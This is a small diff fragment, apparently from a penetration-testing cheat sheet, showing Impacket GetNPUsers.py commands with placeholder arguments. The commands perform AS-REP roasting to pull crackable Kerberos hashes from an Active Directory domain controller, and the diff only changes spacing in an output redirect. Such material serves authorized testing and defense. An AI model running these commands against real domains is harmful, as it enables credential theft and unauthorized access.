@@ -16,4 +16,4 @@ GetNPUsers.py <domain>/<username>:<password> -usersfile <path_to_userslist> -dc-
 GetNPUsers.py <domain>/<username> -hashes <LM_Hash>:<NT_Hash> -usersfile <path_to_userslist> -dc-ip <domain_controller_ip>
 
 # Save the output to a file for further analysis
-GetNPUsers.py <domain>/ -usersfile <path_to_userslist> -dc-ip <domain_controller_ip> -request > <path_to_output_txt>
+GetNPUsers.py <domain>/ -usersfile <path_to_userslist> -dc-ip <domain_controller_ip> -request ><path_to_output_txt>
